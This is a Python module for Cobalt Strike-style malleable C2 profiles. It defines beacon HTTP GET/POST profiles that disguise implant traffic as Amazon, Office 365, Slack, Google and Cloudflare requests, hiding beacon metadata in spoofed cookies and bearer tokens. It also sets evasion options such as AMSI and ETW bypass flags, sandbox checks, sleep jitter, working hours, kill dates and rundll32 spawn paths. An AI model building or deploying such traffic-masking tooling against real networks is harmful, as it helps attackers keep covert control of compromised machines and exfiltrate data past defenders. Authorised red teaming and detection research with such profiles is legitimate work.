"""
Malleable C2 Profiles
Cobalt Strike-style flexible C2 configuration with YAML support

Features:
- Custom URI paths and parameters
- Cookie-based data exfiltration
- Metadata randomization
- Header customization
- Traffic transform profiles
"""
import os
import yaml
import random
import string
import base64
import hashlib
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime, time
from pathlib import Path


@dataclass
class HttpGetProfile:
    """HTTP GET beacon profile"""
    uri: List[str] = field(default_factory=lambda: ["/api/v1/status"])
    client_headers: Dict[str, str] = field(default_factory=dict)
    server_headers: Dict[str, str] = field(default_factory=dict)
    metadata_transform: str = "base64url"  # base64, base64url, netbios, mask
    metadata_header: str = "Cookie"  # Where to put beacon metadata
    metadata_prepend: str = ""
    metadata_append: str = ""
    parameter: Optional[str] = None  # URL parameter for data


@dataclass 
class HttpPostProfile:
    """HTTP POST beacon profile"""
    uri: List[str] = field(default_factory=lambda: ["/api/v1/submit"])
    client_headers: Dict[str, str] = field(default_factory=dict)
    server_headers: Dict[str, str] = field(default_factory=dict)
    output_transform: str = "base64"
    body_transform: str = "base64"
    content_type: str = "application/octet-stream"
    parameter: Optional[str] = None


@dataclass
class StagerProfile:
    """Stager/loader profile"""
    uri: List[str] = field(default_factory=lambda: ["/download"])
    client_headers: Dict[str, str] = field(default_factory=dict)
    server_headers: Dict[str, str] = field(default_factory=dict)


@dataclass
class EvasionConfig:
    """Evasion configuration"""
    level: str = "high"  # low, medium, high
    sleep_jitter: str = "gaussian"  # fixed, random, gaussian, fibonacci
    sleep_time: int = 60
    jitter_percent: int = 30
    proxy_chain: Optional[str] = None
    working_hours: Optional[str] = None  # "09:00-17:00"
    kill_date: Optional[str] = None  # "2026-02-01"
    sandbox_checks: bool = True
    amsi_bypass: bool = True
    etw_bypass: bool = True


@dataclass
class C2Profile:
    """Complete C2 Profile"""
    name: str = "default"
    description: str = "Default C2 profile"
    
    # HTTP settings
    http_get: HttpGetProfile = field(default_factory=HttpGetProfile)
    http_post: HttpPostProfile = field(default_factory=HttpPostProfile)
    stager: StagerProfile = field(default_factory=StagerProfile)
    
    # Global settings
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    headers: Dict[str, str] = field(default_factory=dict)
    
    # Evasion
    evasion: EvasionConfig = field(default_factory=EvasionConfig)
    
    # Certificate
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    
    # DNS settings (for DNS beacon)
    dns_idle: str = "8.8.8.8"
    dns_sleep: int = 0
    
    # Spawn settings
    spawn_to_x86: str = "%windir%\\syswow64\\rundll32.exe"
    spawn_to_x64: str = "%windir%\\sysnative\\rundll32.exe"


class ProfileManager:
    """
    Manage and load C2 profiles from YAML files.
    """
    
    # Built-in profiles
    BUILTIN_PROFILES = {
        "default": {
            "name": "default",
            "description": "Minimal default profile",
            "http_get": {
                "uri": ["/api/status", "/health", "/ping"],
                "metadata_transform": "base64url",
                "metadata_header": "Cookie"
            },
            "http_post": {
                "uri": ["/api/submit", "/api/data", "/upload"],
                "content_type": "application/json"
            },
            "evasion": {
                "level": "medium",
                "sleep_jitter": "random",
                "sleep_time": 60,
                "jitter_percent": 30
            }
        },
        "amazon": {
            "name": "amazon",
            "description": "Mimics Amazon shopping traffic",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "headers": {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br"
            },
            "http_get": {
                "uri": [
                    "/s/ref=nb_sb_noss",
                    "/gp/product/",
                    "/dp/B0",
                    "/hz/wishlist/"
                ],
                "client_headers": {
                    "Host": "www.amazon.com",
                    "Referer": "https://www.amazon.com/"
                },
                "metadata_transform": "base64url",
                "metadata_header": "Cookie",
                "metadata_prepend": "session-id=",
                "metadata_append": "; session-id-time=2082787201l"
            },
            "http_post": {
                "uri": [
                    "/gp/api/updateCart",
                    "/gp/item-dispatch/ref=dp_add_to_cart"
                ],
                "content_type": "application/x-www-form-urlencoded",
                "client_headers": {
                    "Origin": "https://www.amazon.com"
                }
            },
            "evasion": {
                "level": "high",
                "sleep_jitter": "gaussian",
                "sleep_time": 45,
                "jitter_percent": 40
            }
        },
        "microsoft": {
            "name": "microsoft",
            "description": "Mimics Microsoft/Office 365 traffic",
            "user_agent": "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0)",
            "headers": {
                "Accept": "application/json",
                "X-ClientId": "{{RANDOM_GUID}}",
                "X-CorrelationId": "{{RANDOM_GUID}}"
            },
            "http_get": {
                "uri": [
                    "/owa/service.svc",
                    "/EWS/Exchange.asmx",
                    "/api/v2.0/me/messages",
                    "/oab/{{RANDOM_HEX}}/oab.xml"
                ],
                "client_headers": {
                    "Host": "outlook.office365.com"
                },
                "metadata_transform": "base64",
                "metadata_header": "Authorization",
                "metadata_prepend": "Bearer "
            },
            "http_post": {
                "uri": [
                    "/owa/service.svc?action=GetItem",
                    "/api/v2.0/me/sendmail"
                ],
                "content_type": "application/json; charset=utf-8"
            },
            "evasion": {
                "level": "high",
                "sleep_jitter": "gaussian",
                "sleep_time": 30,
                "jitter_percent": 25,
                "working_hours": "08:00-18:00"
            }
        },
        "slack": {
            "name": "slack",
            "description": "Mimics Slack API traffic",
            "user_agent": "Slackbot 1.0 (+https://api.slack.com/robots)",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8"
            },
            "http_get": {
                "uri": [
                    "/api/conversations.list",
                    "/api/users.list",
                    "/api/channels.info"
                ],
                "client_headers": {
                    "Host": "slack.com"
                },
                "metadata_transform": "base64url",
                "metadata_header": "Authorization",
                "metadata_prepend": "Bearer xoxb-"
            },
            "http_post": {
                "uri": [
                    "/api/chat.postMessage",
                    "/api/files.upload"
                ],
                "content_type": "application/json"
            },
            "evasion": {
                "level": "medium",
                "sleep_jitter": "random",
                "sleep_time": 10,
                "jitter_percent": 50
            }
        },
        "google": {
            "name": "google",
            "description": "Mimics Google services traffic",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "headers": {
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9"
            },
            "http_get": {
                "uri": [
                    "/search",
                    "/complete/search",
                    "/async/newtab",
                    "/gen_204"
                ],
                "client_headers": {
                    "Host": "www.google.com"
                },
                "metadata_transform": "base64url",
                "metadata_header": "Cookie",
                "metadata_prepend": "NID=",
                "parameter": "q"
            },
            "http_post": {
                "uri": [
                    "/gen_204",
                    "/async/newtab"
                ],
                "content_type": "application/x-www-form-urlencoded"
            },
            "evasion": {
                "level": "high",
                "sleep_jitter": "fibonacci",
                "sleep_time": 60,
                "jitter_percent": 35
            }
        },
        "cloudflare": {
            "name": "cloudflare",
            "description": "Mimics Cloudflare CDN traffic",
            "user_agent": "Mozilla/5.0 (compatible; Cloudflare-Traffic-Manager)",
            "http_get": {
                "uri": [
                    "/cdn-cgi/trace",
                    "/cdn-cgi/challenge-platform/",
                    "/__cf_chl_rt_tk="
                ],
                "metadata_transform": "base64url",
                "metadata_header": "cf-ray"
            },
            "http_post": {
                "uri": ["/cdn-cgi/challenge-platform/generate/"],
                "content_type": "application/x-www-form-urlencoded"
            },
            "evasion": {
                "level": "high",
                "sleep_jitter": "gaussian"
            }
        }
    }
    
    def __init__(self, profiles_dir: str = None):
        self.profiles_dir = profiles_dir or os.path.join(
            os.path.dirname(__file__), 'profiles'
        )
        self.profiles: Dict[str, C2Profile] = {}
        self._load_builtin_profiles()
    
    def _load_builtin_profiles(self):
        """Load built-in profiles"""
        for name, data in self.BUILTIN_PROFILES.items():
            self.profiles[name] = self._dict_to_profile(data)
    
    def _dict_to_profile(self, data: Dict) -> C2Profile:
        """Convert dictionary to C2Profile"""
        profile = C2Profile()
        profile.name = data.get('name', 'unnamed')
        profile.description = data.get('description', '')
        profile.user_agent = data.get('user_agent', profile.user_agent)
        profile.headers = data.get('headers', {})
        
        # HTTP GET
        if 'http_get' in data:
            get_data = data['http_get']
            profile.http_get = HttpGetProfile(
                uri=get_data.get('uri', ['/api/status']),
                client_headers=get_data.get('client_headers', {}),
                server_headers=get_data.get('server_headers', {}),
                metadata_transform=get_data.get('metadata_transform', 'base64url'),
                metadata_header=get_data.get('metadata_header', 'Cookie'),
                metadata_prepend=get_data.get('metadata_prepend', ''),
                metadata_append=get_data.get('metadata_append', ''),
                parameter=get_data.get('parameter')
            )
        
        # HTTP POST
        if 'http_post' in data:
            post_data = data['http_post']
            profile.http_post = HttpPostProfile(
                uri=post_data.get('uri', ['/api/submit']),
                client_headers=post_data.get('client_headers', {}),
                server_headers=post_data.get('server_headers', {}),
                output_transform=post_data.get('output_transform', 'base64'),
                body_transform=post_data.get('body_transform', 'base64'),
                content_type=post_data.get('content_type', 'application/octet-stream'),
                parameter=post_data.get('parameter')
            )
        
        # Evasion config
        if 'evasion' in data:
            ev_data = data['evasion']
            profile.evasion = EvasionConfig(
                level=ev_data.get('level', 'medium'),
                sleep_jitter=ev_data.get('sleep_jitter', 'random'),
                sleep_time=ev_data.get('sleep_time', 60),
                jitter_percent=ev_data.get('jitter_percent', 30),
                proxy_chain=ev_data.get('proxy_chain'),
                working_hours=ev_data.get('working_hours'),
                kill_date=ev_data.get('kill_date'),
                sandbox_checks=ev_data.get('sandbox_checks', True),
                amsi_bypass=ev_data.get('amsi_bypass', True),
                etw_bypass=ev_data.get('etw_bypass', True)
            )
        
        return profile
    
    def load_from_yaml(self, yaml_path: str) -> C2Profile:
        """Load profile from YAML file"""
        with open(yaml_path, 'r') as f:
            data = yaml.safe_load(f)
        
        profile = self._dict_to_profile(data)
        self.profiles[profile.name] = profile
        return profile
    
    def load_from_yaml_string(self, yaml_content: str) -> C2Profile:
        """Load profile from YAML string"""
        data = yaml.safe_load(yaml_content)
        profile = self._dict_to_profile(data)
        self.profiles[profile.name] = profile
        return profile
    
    def load_profiles_dir(self):
        """Load all profiles from profiles directory"""
        if not os.path.exists(self.profiles_dir):
            os.makedirs(self.profiles_dir, exist_ok=True)
            return
        
        for file in Path(self.profiles_dir).glob('*.yaml'):
            try:
                self.load_from_yaml(str(file))
            except Exception as e:
                print(f"Failed to load profile {file}: {e}")
        
        for file in Path(self.profiles_dir).glob('*.yml'):
            try:
                self.load_from_yaml(str(file))
            except Exception as e:
                print(f"Failed to load profile {file}: {e}")
    
    def get_profile(self, name: str) -> Optional[C2Profile]:
        """Get profile by name"""
        return self.profiles.get(name)
    
    def list_profiles(self) -> List[str]:
        """List available profile names"""
        return list(self.profiles.keys())
    
    def save_profile(self, profile: C2Profile, path: str = None):
        """Save profile to YAML file"""
        if path is None:
            path = os.path.join(self.profiles_dir, f"{profile.name}.yaml")
        
        data = self._profile_to_dict(profile)
        
        with open(path, 'w') as f:
            yaml.dump(data, f, default_flow_style=False, sort_keys=False)
    
    def _profile_to_dict(self, profile: C2Profile) -> Dict:
        """Convert profile to dictionary for YAML export"""
        return {
            'name': profile.name,
            'description': profile.description,
            'user_agent': profile.user_agent,
            'headers': profile.headers,
            'http_get': {
                'uri': profile.http_get.uri,
                'client_headers': profile.http_get.client_headers,
                'server_headers': profile.http_get.server_headers,
                'metadata_transform': profile.http_get.metadata_transform,
                'metadata_header': profile.http_get.metadata_header,
                'metadata_prepend': profile.http_get.metadata_prepend,
                'metadata_append': profile.http_get.metadata_append,
                'parameter': profile.http_get.parameter
            },
            'http_post': {
                'uri': profile.http_post.uri,
                'client_headers': profile.http_post.client_headers,
                'server_headers': profile.http_post.server_headers,
                'content_type': profile.http_post.content_type,
                'parameter': profile.http_post.parameter
            },
            'evasion': {
                'level': profile.evasion.level,
                'sleep_jitter': profile.evasion.sleep_jitter,
                'sleep_time': profile.evasion.sleep_time,
                'jitter_percent': profile.evasion.jitter_percent,
                'proxy_chain': profile.evasion.proxy_chain,
                'working_hours': profile.evasion.working_hours,
                'kill_date': profile.evasion.kill_date,
                'sandbox_checks': profile.evasion.sandbox_checks,
                'amsi_bypass': profile.evasion.amsi_bypass,
                'etw_bypass': profile.evasion.etw_bypass
            }
        }


class ProfileApplicator:
    """
    Apply C2 profiles to requests/responses.
    Transforms data according to profile settings.
    """
    
    def __init__(self, profile: C2Profile):
        self.profile = profile
    
    def transform_metadata(self, data: bytes, transform: str) -> str:
        """Transform metadata according to profile"""
        if transform == 'base64':
            return base64.b64encode(data).decode()
        elif transform == 'base64url':
            return base64.urlsafe_b64encode(data).decode().rstrip('=')
        elif transform == 'netbios':
            return self._netbios_encode(data)
        elif transform == 'mask':
            return self._mask_transform(data)
        else:
            return data.hex()
    
    def _netbios_encode(self, data: bytes) -> str:
        """NetBIOS-style encoding"""
        result = []
        for byte in data:
            high = (byte >> 4) + ord('a')
            low = (byte & 0x0F) + ord('a')
            result.append(chr(high))
            result.append(chr(low))
        return ''.join(result)
    
    def _mask_transform(self, data: bytes) -> str:
        """XOR mask transform"""
        mask = 0x5A
        masked = bytes([b ^ mask for b in data])
        return base64.b64encode(masked).decode()
    
    def build_get_request(self, metadata: bytes) -> Dict:
        """Build HTTP GET request according to profile"""
        http_get = self.profile.http_get
        
        # Select random URI
        uri = random.choice(http_get.uri)
        uri = self._expand_placeholders(uri)
        
        # Transform metadata
        transformed = self.transform_metadata(metadata, http_get.metadata_transform)
        
        # Build headers
        headers = dict(self.profile.headers)
        headers.update(http_get.client_headers)
        headers['User-Agent'] = self._expand_placeholders(self.profile.user_agent)
        
        # Add metadata to appropriate location
        metadata_value = f"{http_get.metadata_prepend}{transformed}{http_get.metadata_append}"
        headers[http_get.metadata_header] = metadata_value
        
        # Build URL with parameter if specified
        params = {}
        if http_get.parameter:
            params[http_get.parameter] = transformed
        
        return {
            'method': 'GET',
            'uri': uri,
            'headers': headers,
            'params': params
        }
    
    def build_post_request(self, data: bytes, metadata: bytes = None) -> Dict:
        """Build HTTP POST request according to profile"""
        http_post = self.profile.http_post
        
        # Select random URI
        uri = random.choice(http_post.uri)
        uri = self._expand_placeholders(uri)
        
        # Transform body
        transformed_body = self.transform_metadata(data, http_post.body_transform)
        
        # Build headers
        headers = dict(self.profile.headers)
        headers.update(http_post.client_headers)
        headers['User-Agent'] = self._expand_placeholders(self.profile.user_agent)
        headers['Content-Type'] = http_post.content_type
        
        # Add metadata if provided
        if metadata:
            http_get = self.profile.http_get
            transformed_meta = self.transform_metadata(metadata, http_get.metadata_transform)
            metadata_value = f"{http_get.metadata_prepend}{transformed_meta}{http_get.metadata_append}"
            headers[http_get.metadata_header] = metadata_value
        
        return {
            'method': 'POST',
            'uri': uri,
            'headers': headers,
            'body': transformed_body
        }
    
    def _expand_placeholders(self, text: str) -> str:
        """Expand placeholders in text"""
        replacements = {
            '{{RANDOM_GUID}}': self._random_guid(),
            '{{RANDOM_HEX}}': self._random_hex(16),
            '{{RANDOM_B64}}': self._random_base64(16),
            '{{TIMESTAMP}}': str(int(datetime.now().timestamp())),
            '{{DATE}}': datetime.now().strftime('%Y-%m-%d'),
        }
        
        for placeholder, value in replacements.items():
            text = text.replace(placeholder, value)
        
        return text
    
    def _random_guid(self) -> str:
        """Generate random GUID"""
        import uuid
        return str(uuid.uuid4())
    
    def _random_hex(self, length: int) -> str:
        """Generate random hex string"""
        return ''.join(random.choices('0123456789abcdef', k=length))
    
    def _random_base64(self, length: int) -> str:
        """Generate random base64 string"""
        data = os.urandom(length)
        return base64.urlsafe_b64encode(data).decode().rstrip('=')
    
    def check_working_hours(self) -> bool:
        """Check if current time is within working hours"""
        working_hours = self.profile.evasion.working_hours
        if not working_hours:
            return True
        
        try:
            start_str, end_str = working_hours.split('-')
            start_hour, start_min = map(int, start_str.split(':'))
            end_hour, end_min = map(int, end_str.split(':'))
            
            now = datetime.now().time()
            start = time(start_hour, start_min)
            end = time(end_hour, end_min)
            
            return start <= now <= end
        except:
            return True
    
    def check_kill_date(self) -> bool:
        """Check if kill date has passed (returns False if killed)"""
        kill_date = self.profile.evasion.kill_date
        if not kill_date:
            return True
        
        try:
            kill = datetime.strptime(kill_date, '%Y-%m-%d').date()
            return datetime.now().date() < kill
        except:
            return True


# Convenience functions
def get_profile_manager() -> ProfileManager:
    """Get profile manager instance"""
    return ProfileManager()


def load_profile(name: str) -> Optional[C2Profile]:
    """Load profile by name"""
    manager = ProfileManager()
    return manager.get_profile(name)


def list_profiles() -> List[str]:
    """List available profiles"""
    manager = ProfileManager()
    return manager.list_profiles()
